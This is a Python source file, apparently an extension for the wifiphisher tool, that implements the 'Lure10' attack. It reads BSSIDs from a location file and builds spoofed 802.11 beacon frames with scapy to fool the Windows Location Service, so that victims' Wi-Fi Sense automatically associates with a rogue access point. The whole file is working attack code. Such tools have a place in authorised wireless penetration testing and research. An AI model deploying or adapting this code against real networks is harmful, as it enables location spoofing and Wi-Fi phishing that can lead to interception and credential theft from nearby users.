"""
Extension that implements the Lure10 attack.

Exploits the Wi-Fi Sense feature and will result
to automatic association by fooling the Windows
Location Service
"""

import wifiphisher.common.constants as constants
import scapy.layers.dot11 as dot11


class Lure10(object):
    """
    Sends a number of beacons to fool Windows Location Service
    """

    def __init__(self, shared_data):
        """
        Setup the class with all the given arguments

        :param self: A Lure10 object
        :param data: Shared data from main engine
        :type self: Deauthentication
        :type data: dict
        :return: None
        :rtype: None
        """

        self.first_run = True
        self.should_notify = False
        self.data = shared_data

    def get_packet(self, pkt):
        """
        We start broadcasting the beacons on the first received packet

        :param self: A Lure10 object
        :param packet: A scapy.layers.RadioTap object
        :type self: Lure10
        :type packet: scapy.layers.RadioTap
        :return: A tuple containing ["*"] followed by a list of
            the crafted beacon frames
        :rtype: tuple(list, list)
        .. warning: pkt is not used here but should not be removed since
            this prototype is requirement
        """

        # only run this code once
        if self.first_run and self.data.args.lure10_exploit:

            # setup our data structures inside the if for a better performance
            beacons = list()
            bssid = str()

            # locate the lure10 file
            area_file = constants.LOCS_DIR + self.data.args.lure10_exploit

            # open the file
            with open(area_file) as _file:
                for line in _file:
                    # remove any white space and store the bssid(fist word)
                    line.strip()
                    bssid = line.split(" ", 1)[0]

                    # craft the required packet parts
                    frame_part_0 = dot11.RadioTap()
                    frame_part_1 = dot11.Dot11(subtype=8, addr1=constants.WIFI_BROADCAST,
                                               addr2=bssid, addr3=bssid)
                    frame_part_2 = dot11.Dot11Beacon(cap=0x2105)
                    frame_part_3 = dot11.Dot11Elt(ID="SSID", info="")
                    frame_part_4 = dot11.Dot11Elt(ID="Rates", info=constants.AP_RATES)
                    frame_part_5 = dot11.Dot11Elt(ID="DSset", info=chr(7))

                    # create a complete packet by combining the parts
                    complete_frame = (frame_part_0 / frame_part_1 / frame_part_2 / frame_part_3 /
                                      frame_part_4 / frame_part_5)

                    # add the frame to the list
                    beacons.append(complete_frame)

                    # make sure this block is never executed again and the notification occurs
                    self.first_run = False
                    self.should_notify = True

            return (["*"], beacons)

    def send_output(self):
        """
        Sending Lure10 notification

        :param self: A Lure10 object
        :type self: Lure10
        :return: list of notification messages
        :rtype: list
        .. note: Only sends notification for the first time to reduce
            clutters
        """

        # only run it once the packet crafting is done
        if self.should_notify and self.data.args.lure10_exploit:

            # make sure this block is not executed again
            self.should_notify = False

            return ["Lure10 - Spoofing location services"]

    def send_channels(self):
        """
        Send all interested channels

        :param self: A Lure10 object
        :type self: Lure10
        :return: A list with all the channels interested
        :rtype: list
        .. note: Only the channel of the target AP is sent here
        """

        return [self.data.target_ap_channel]
